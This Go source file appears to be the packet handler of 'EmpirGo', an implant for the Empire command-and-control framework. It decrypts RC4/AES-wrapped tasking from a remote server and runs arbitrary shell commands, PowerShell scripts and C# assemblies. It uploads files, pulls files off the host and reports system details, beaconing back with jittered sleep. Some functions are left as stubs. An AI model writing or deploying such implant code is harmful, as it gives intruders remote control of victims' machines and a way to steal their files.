package main

import (
	"EmpirGo/common"
	"EmpirGo/tasks"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	mathrand "math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

type PacketHandler struct {
	missedCheckins int
	server         string
	headers        map[string]string
	taskURIs       []string
	stagingKey     []byte
	sessionID      string
	aeskey         []byte
	agent          *MainAgent
}

func (ph *PacketHandler) powershellTask(data []byte, resultID int) {
	script := string(data)
	result := tasks.RunPowerShellScript(script)
	ph.SendMessage(ph.BuildResponsePacket(112, result, resultID))
}

func (ph *PacketHandler) csharpTask(data []byte, resultID int) {
	dataStr := string(data)
	parts := strings.Split(dataStr, ",")
	params := parts[1:]
	dataBytes, _ := base64.StdEncoding.DecodeString(parts[0])

	// Run the C# task
	result := tasks.Runcsharptask(dataBytes, params)

	// Send the captured output back
	ph.SendMessage(ph.BuildResponsePacket(120, result, resultID))
}

// csharpTaskBackground runs the C# task in the background and sends the result when done
func (ph *PacketHandler) csharpTaskBackground(data []byte, resultID int) {
	dataStr := string(data)
	parts := strings.Split(dataStr, ",")
	params := parts[1:]
	dataBytes, _ := base64.StdEncoding.DecodeString(parts[0])

	// Run the C# task in the background, with a callback to send the result back
	tasks.RunCsharpTaskInBackground(dataBytes, params, func(result string) {
		// Callback function to send the result back when the task finishes
		ph.SendMessage(ph.BuildResponsePacket(122, result, resultID))
	})
}

func (ph *PacketHandler) buildRoutingPacket(stagingKey []byte, sessionID string, meta int, encData []byte) []byte {
	buf := new(bytes.Buffer)
	buf.WriteString(sessionID)
	binary.Write(buf, binary.LittleEndian, uint8(2))
	binary.Write(buf, binary.LittleEndian, uint8(meta))
	binary.Write(buf, binary.LittleEndian, uint16(0))
	binary.Write(buf, binary.LittleEndian, uint32(len(encData)))
	data := buf.Bytes()

	rc4IV := make([]byte, 4)
	if _, err := io.ReadFull(rand.Reader, rc4IV); err != nil {
		fmt.Println("Error generating RC4 IV:", err)
		return nil
	}

	key := append(rc4IV, stagingKey...)
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		fmt.Println("Error creating RC4 cipher:", err)
		return nil
	}

	rc4EncData := make([]byte, len(data))
	cipher.XORKeyStream(rc4EncData, data)

	packet := append(rc4IV, rc4EncData...)
	packet = append(packet, encData...)

	return packet
}

func (ph *PacketHandler) rc4(key []byte, data []byte) ([]byte, error) {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return nil, err
	}
	decrypted := make([]byte, len(data))
	cipher.XORKeyStream(decrypted, data)
	return decrypted, nil
}

func (ph *PacketHandler) parseRoutingPacket(stagingKey []byte, data []byte) (map[string][]interface{}, error) {
	results := make(map[string][]interface{})
	offset := 0

	for len(data)-offset >= 20 {
		RC4IV := binary.BigEndian.Uint32(data[:4])
		RC4IVBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(RC4IVBytes, RC4IV)

		routingKey := append(RC4IVBytes, stagingKey...)
		routingPacket, err := ph.rc4(routingKey, data[4:20])
		if err != nil {
			return nil, err
		}

		sessionID := string(routingPacket[:8])
		language := routingPacket[8]
		meta := routingPacket[9]
		additional := binary.LittleEndian.Uint16(routingPacket[10:12])
		length := binary.LittleEndian.Uint32(routingPacket[12:16])

		var encData []byte
		if length > 0 {
			encData = data[offset+20 : offset+20+int(length)]
		} else {
			encData = nil
		}

		results[sessionID] = []interface{}{language, meta, additional, encData}

		offset += 20 + int(length)
		if offset >= len(data) {
			break
		}
	}

	if len(results) == 0 {
		return nil, fmt.Errorf("no valid routing packets found")
	}

	return results, nil
}

func (ph *PacketHandler) decodeRoutingPacket(data []byte) {
	packets, err := ph.parseRoutingPacket(ph.stagingKey, data)
	if err != nil {
		fmt.Println("Error parsing routing packet:", err)
		return
	}

	for agentID, packet := range packets {
		if agentID == ph.sessionID {
			language := packet[0].(byte)
			meta := packet[1].(byte)
			additional := packet[2].(uint16)
			encData := packet[3].([]byte)

			fmt.Printf("Language: %d, Meta: %d, Additional: %d\n", language, meta, additional)

			ph.processTasking(encData)
		} else {
			encodedData := base64.StdEncoding.EncodeToString(data)
			fmt.Println("Queued data for other agents:", encodedData)
		}
	}
}

func parseTaskPacket(data []byte, offset int) (uint16, uint16, uint16, uint16, uint32, []byte, []byte, error) {
	if len(data) < offset+12 {
		return 0, 0, 0, 0, 0, nil, nil, fmt.Errorf("data too short to parse")
	}

	packetType := binary.LittleEndian.Uint16(data[offset : offset+2])
	totalPacket := binary.LittleEndian.Uint16(data[offset+2 : offset+4])
	packetNum := binary.LittleEndian.Uint16(data[offset+4 : offset+6])
	resultID := binary.LittleEndian.Uint16(data[offset+6 : offset+8])
	length := binary.LittleEndian.Uint32(data[offset+8 : offset+12])

	if len(data) < offset+12+int(length) {
		return 0, 0, 0, 0, 0, nil, nil, fmt.Errorf("data too short for specified length")
	}

	packetData := data[offset+12 : offset+12+int(length)]
	remainingData := data[offset+12+int(length):]

	return packetType, totalPacket, packetNum, resultID, length, packetData, remainingData, nil
}

func (ph *PacketHandler) processTasking(encData []byte) {
	tasking, err := common.AesDecryptAndVerify(ph.aeskey, encData)
	if err != nil {
		fmt.Println("Error decrypting and verifying tasking data:", err)
		return
	}

	offset := 0
	var resultPackets string

	for {
		packetType, totalPacket, packetNum, resultID, length, data, remainingData, err := parseTaskPacket(tasking, offset)
		if err != nil {
			fmt.Println("Error parsing task packet:", err)
			return
		}
		fmt.Println("Processing task packet - Type:", packetType, "Total:", totalPacket, "Num:", packetNum, "ResultID:", resultID, "Length:", length, "Data:", string(data))

		result := ph.processPacket(packetType, data, int(resultID))
		if result != "" {
			resultPackets += result
		}

		offset += 12 + int(length)
		if len(remainingData) == 0 {
			break
		}
	}
}

func (ph *PacketHandler) processPacket(packetType uint16, data []byte, resultID int) string {
	switch packetType {
	case 1:
		sysinfo := ph.getSysinfo(ph.server, "00000000")
		ph.SendMessage(ph.BuildResponsePacket(1, sysinfo, resultID))
		return ""
	case 2:
		ph.SendMessage(ph.BuildResponsePacket(2, "Agent exiting", resultID))
		os.Exit(0)
		return ""
	case 34:
		ph.SendMessage(ph.BuildResponsePacket(34, "Task Set Proxy: unimplemented", resultID))
		return "unimplemented"
	case 40:
		command := string(data)
		result := common.RunCommand(command)
		ph.SendMessage(ph.BuildResponsePacket(40, result, resultID))
		return result
	case 41:
		filePath := string(data)
		ph.FileDownloadHandler(filePath, resultID)
		return ""
	case 42:
		result, err := tasks.FileUpload(string(data))
		if err != nil {
			ph.SendMessage(ph.BuildResponsePacket(0, fmt.Sprintf("[!] Error in file upload: %s", err), resultID))
			return "error"
		}
		ph.SendMessage(ph.BuildResponsePacket(42, result, resultID))
		return "completed"
	case 43:
		ph.DirectoryListHandler(string(data), resultID)
		return ""
	case 50:
		ph.SendMessage(ph.BuildResponsePacket(50, "Task List: unimplemented", resultID))
		return "unimplemented"
	case 51:
		ph.SendMessage(ph.BuildResponsePacket(51, "Stop Task: unimplemented", resultID))
		return "unimplemented"
	case 60:
		ph.SendMessage(ph.BuildResponsePacket(60, "Start Socks Server: unimplemented", resultID))
		return "unimplemented"
	case 70:
		ph.SendMessage(ph.BuildResponsePacket(60, "Start SMB Pipe Server: unimplemented", resultID))
		return "unimplemented"
	case 100, 101, 102:
		ph.powershellTask(data, resultID)
		return ""
	case 120:
		ph.csharpTask(data, resultID)
		return ""
	case 122:
		ph.csharpTaskBackground(data, resultID)
		return ""
	default:
		ph.SendMessage(ph.BuildResponsePacket(0, fmt.Sprintf("invalid tasking ID: %d", packetType), resultID))
		return ""
	}
}

func (ph *PacketHandler) getSysinfo(server string, nonce string) string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	processID := os.Getpid()
	language := "go"
	processName := os.Args[0]
	osDetails := "GOOS: " + os.Getenv("GOOS") + ", GOARCH: " + os.Getenv("GOARCH")

	internalIP := "127.0.0.1"
	architecture := "x86_64"
	pyVersion := "1.0"

	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s|%d|%s|%s|%s",
		nonce, server, "", username, hostname, internalIP, osDetails, "False", processName, processID,
		language, pyVersion, architecture)
}

func (ph *PacketHandler) SendMessage(packets []byte) (string, []byte) {
	var data []byte

	if packets != nil {
		encData := common.AesEncryptThenHMAC(ph.aeskey, packets)
		data = ph.buildRoutingPacket(ph.stagingKey, ph.sessionID, 5, encData)
	} else {
		routingPacket := ph.buildRoutingPacket(ph.stagingKey, ph.sessionID, 4, nil)
		b64RoutingPacket := base64.StdEncoding.EncodeToString(routingPacket)
		if ph.headers == nil {
			ph.headers = make(map[string]string)
		}
		ph.headers["Cookie"] = "session=" + b64RoutingPacket
	}

	if len(ph.taskURIs) == 0 {
		fmt.Println("No task URIs defined")
		return "", nil
	}
	taskURI := ph.taskURIs[mathrand.Intn(len(ph.taskURIs))]
	requestURI := ph.server + taskURI

	var req *http.Request
	var err error

	if packets != nil {
		req, err = http.NewRequest("POST", requestURI, bytes.NewReader(data))
	} else {
		req, err = http.NewRequest("GET", requestURI, nil)
	}

	if err != nil {
		fmt.Println("Error creating request:", err)
		ph.missedCheckins++
		return "", nil
	}

	for k, v := range ph.headers {
		req.Header.Set(k, v)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		ph.missedCheckins++
		return "", nil
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		ph.missedCheckins++
		return "", nil
	}

	if resp.StatusCode == 200 {
		return "200", body
	} else {
		ph.missedCheckins++
		if resp.StatusCode == 401 {
			fmt.Println("Unauthorized access, exiting...")
			os.Exit(0)
		}
		return fmt.Sprint(resp.StatusCode), nil
	}
}

func (ph *PacketHandler) BuildResponsePacket(taskingID int, packetData string, resultID int) []byte {
	buf := new(bytes.Buffer)

	binary.Write(buf, binary.LittleEndian, uint16(taskingID))
	binary.Write(buf, binary.LittleEndian, uint16(1))
	binary.Write(buf, binary.LittleEndian, uint16(1))
	binary.Write(buf, binary.LittleEndian, uint16(resultID))

	if packetData != "" {
		encodedData := base64.StdEncoding.EncodeToString([]byte(packetData))
		binary.Write(buf, binary.LittleEndian, uint32(len(encodedData)))
		buf.Write([]byte(encodedData))
	} else {
		binary.Write(buf, binary.LittleEndian, uint32(0))
	}

	return buf.Bytes()
}

func (ph *PacketHandler) FileDownloadHandler(data string, resultID int) {
	fileList, err := tasks.FileDownload(data)
	if err != nil || len(fileList) == 0 {
		ph.SendFileNotFoundResponse(resultID)
		return
	}

	for _, filePath := range fileList {
		offset := 0
		size := tasks.GetFileSize(filePath)
		partIndex := 0

		for {
			encodedPart, err := tasks.GetFilePart(filePath, offset)
			if err != nil || len(encodedPart) == 0 {
				break
			}

			partData := ph.processFilePart(encodedPart, filePath, partIndex, size, resultID)
			if len(partData) == 0 {
				break
			}

			ph.SendMessage([]byte(partData))

			sleepTime := ph.getRandomSleepTime()
			time.Sleep(sleepTime)
			partIndex++
			offset += 512000
		}
	}
}

func (ph *PacketHandler) SendFileNotFoundResponse(resultID int) {
	ph.SendMessage(ph.BuildResponsePacket(40, "file does not exist or cannot be accessed", resultID))
}

func (ph *PacketHandler) processFilePart(encodedPart []byte, filePath string, partIndex int, size int64, resultID int) string {
	compData := compress(encodedPart)
	header := buildHeader(compData)
	encodedPartBase64 := base64.StdEncoding.EncodeToString(header)

	partData := fmt.Sprintf("%d|%s|%d|%s", partIndex, filePath, size, encodedPartBase64)
	return partData
}

func (ph *PacketHandler) getRandomSleepTime() time.Duration {
	minSleep := int((1.0 - ph.agent.jitter) * float64(ph.agent.delay))
	maxSleep := int((1.0 + ph.agent.jitter) * float64(ph.agent.delay))
	sleepTime := mathrand.Intn(maxSleep-minSleep) + minSleep
	return time.Duration(sleepTime) * time.Millisecond
}

// Placeholder for compress and buildHeader functions
func compress(data []byte) []byte {
	// Implement compression logic
	return nil
}

func buildHeader(data []byte) []byte {
	// Implement header construction logic
	return nil
}

func (ph *PacketHandler) DirectoryListHandler(data string, resultID int) {
	// If data is empty, list all drives
	result, err := tasks.DirectoryList(data)
	if err != nil {
		ph.SendMessage(ph.BuildResponsePacket(43, fmt.Sprintf("Directory %s not found.", data), resultID))
		return
	}

	// Convert the result to JSON
	resultData, err := json.Marshal(result)
	if err != nil {
		ph.SendMessage(ph.BuildResponsePacket(43, "Error processing directory data", resultID))
		return
	}

	// Send the result back
	ph.SendMessage(ph.BuildResponsePacket(43, string(resultData), resultID))
}
